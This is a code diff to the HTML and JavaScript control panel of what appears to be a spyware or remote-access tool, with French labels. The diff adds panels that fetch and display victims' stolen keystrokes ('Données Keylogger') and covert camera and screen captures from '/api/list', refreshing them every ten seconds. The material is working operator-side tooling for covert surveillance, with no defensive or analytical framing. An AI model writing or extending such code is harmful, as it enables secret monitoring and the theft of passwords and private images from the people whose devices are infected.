@@ -100,6 +100,15 @@
         }
         .stat-value { font-size: 24px; font-weight: bold; }
         .stat-label { font-size: 12px; color: #666; margin-top: 5px; }
+        .capture-img { 
+            max-width: 200px; 
+            max-height: 150px; 
+            border: 2px solid #00ff41; 
+            border-radius: 5px;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        .capture-img:hover { transform: scale(1.05); }
         input[type="text"], input[type="number"] {
             width: 100%;
             padding: 10px;
@@ -184,13 +193,24 @@
             </div>
         </div>
 
-        <!-- Logs -->
+        <!-- Visualisation des données -->
         <div class="panel" style="grid-column: 1 / -1;">
-            <h2>📋 Journal d'Activité</h2>
-            <div class="log" id="activityLog">
-                <div class="log-entry success">Système initialisé...</div>
+            <h2>📸 Dernières Captures</h2>
+            <div style="display: flex; gap: 10px; overflow-x: auto; padding: 10px 0;">
+                <div id="capturesContainer" style="display: flex; gap: 10px; min-height: 150px;">
+                    <div style="color: #666; font-size: 14px; padding: 20px;">Aucune capture pour le moment...</div>
+                </div>
             </div>
-            <button onclick="clearLog()" class="danger">🗑️ Effacer Journal</button>
+            <button onclick="refreshCaptures()">🔄 Actualiser</button>
+        </div>
+
+        <!-- Keylogger Data -->
+        <div class="panel" style="grid-column: 1 / -1;">
+            <h2>⌨️ Données Keylogger</h2>
+            <div class="log" id="keylogData" style="height: 150px; font-family: monospace; white-space: pre-wrap;">
+                Aucune donnée de frappe pour le moment...
+            </div>
+            <button onclick="refreshKeylogData()">🔄 Actualiser</button>
         </div>
 
         <!-- Stats -->
@@ -214,6 +234,15 @@
                     <div class="stat-label">Commandes envoyées</div>
                 </div>
             </div>
+        </div>
+
+        <!-- Logs -->
+        <div class="panel" style="grid-column: 1 / -1;">
+            <h2>📋 Journal d'Activité</h2>
+            <div class="log" id="activityLog">
+                <div class="log-entry success">Système initialisé...</div>
+            </div>
+            <button onclick="clearLog()" class="danger">🗑️ Effacer Journal</button>
         </div>
     </div>
 
@@ -322,9 +351,80 @@
             }
         }
 
+        // Récupérer et afficher les captures
+        async function refreshCaptures() {
+            try {
+                const response = await fetch('/api/list');
+                if (response.ok) {
+                    const result = await response.json();
+                    const container = document.getElementById('capturesContainer');
+                    container.innerHTML = '';
+                    
+                    if (result.data && result.data.length > 0) {
+                        const images = result.data.filter(d => d && (d.type === 'camera' || d.type === 'screen'));
+                        
+                        if (images.length > 0) {
+                            images.slice(0, 10).forEach(img => {
+                                const imgEl = document.createElement('div');
+                                imgEl.style.cssText = 'flex-shrink: 0; border: 2px solid #00ff41; border-radius: 5px; overflow: hidden;';
+                                imgEl.innerHTML = `
+                                    <img src="${img.image}" style="width: 200px; height: 150px; object-fit: cover; display: block;">
+                                    <div style="padding: 5px; font-size: 11px; background: rgba(0,0,0,0.5);">
+                                        ${img.type} - ${new Date().toLocaleTimeString()}
+                                    </div>
+                                `;
+                                container.appendChild(imgEl);
+                            });
+                            stats.images = images.length;
+                            document.getElementById('statImages').textContent = images.length;
+                        } else {
+                            container.innerHTML = '<div style="color: #666; padding: 20px;">Aucune image capturée</div>';
+                        }
+                    } else {
+                        container.innerHTML = '<div style="color: #666; padding: 20px;">Aucune donnée disponible</div>';
+                    }
+                }
+            } catch (error) {
+                log(`❌ Erreur chargement captures: ${error.message}`, 'error');
+            }
+        }
+
+        // Récupérer les données du keylogger
+        async function refreshKeylogData() {
+            try {
+                const response = await fetch('/api/list');
+                if (response.ok) {
+                    const result = await response.json();
+                    const keylogEl = document.getElementById('keylogData');
+                    
+                    if (result.data && result.data.length > 0) {
+                        const keylogs = result.data.filter(d => d && d.type === 'keylog');
+                        
+                        if (keylogs.length > 0) {
+                            const allKeys = keylogs.map(k => k.keys).join('\n---\n');
+                            keylogEl.textContent = allKeys;
+                            stats.keys = allKeys.length;
+                            document.getElementById('statKeys').textContent = allKeys.length;
+                        } else {
+                            keylogEl.textContent = 'Aucune frappe enregistrée';
+                        }
+                    } else {
+                        keylogEl.textContent = 'Aucune donnée disponible';
+                    }
+                }
+            } catch (error) {
+                log(`❌ Erreur chargement keylog: ${error.message}`, 'error');
+            }
+        }
+
         // Rafraîchir toutes les 5 secondes
         setInterval(refreshStats, 5000);
+        setInterval(refreshCaptures, 10000);
+        setInterval(refreshKeylogData, 10000);
+        
         refreshStats();
+        refreshCaptures();
+        refreshKeylogData();
 
         log('🚀 Panneau de contrôle prêt', 'success');
     </script>
